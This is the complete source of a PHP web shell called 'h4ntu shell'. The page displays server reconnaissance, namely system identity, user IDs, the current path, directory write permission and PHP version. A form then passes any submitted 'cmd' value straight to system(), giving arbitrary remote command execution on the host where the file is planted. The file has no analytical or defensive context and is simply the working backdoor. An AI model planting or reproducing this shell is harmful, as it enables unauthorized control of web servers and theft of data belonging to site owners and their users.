<title>h4ntu shell [powered by tsoi]</title>
<?php
echo "<p><font size=2 face=Verdana><b>This Is The Server Information</b></font></p>";
?>

<?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<meta name="generator" content="Namo WebEditor v5.0">
<br>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><?= $info ?>: <?= $value ?></DIV></TD>
  </TR>
<?php
  }
?>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Current Path:</b> <?= $chdir ?></DIV></TD>

  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?></DIV></TD>
  </TR>  
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV></TD>
  </TR>

  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Adress:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?></DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Script Current User:</b> <?= $user ?></DIV></TD>
  </TR>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>PHP Version:</b> <?= $ver ?></DIV></TD>
  </TR>
</TABLE>
<BR>

<font face="courier new" size="2" color="777777"><b>#</b>php injection: <br>
</font><FORM name=injection METHOD=POST ACTION="<?php echo $_SERVER["REQUEST_URI"];?>">
<font face="courier new" size="2" color="777777">cmd : 
<INPUT TYPE="text" NAME="cmd" value="<?php echo stripslashes(htmlentities($_POST['cmd'])); ?>" size="161">
<br>
<INPUT TYPE="submit">
</font></FORM>

<hr color=777777 width=100% height=115px>

<pre>
<?
$cmd = $_POST['cmd'];
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
exit;
?>
</pre>
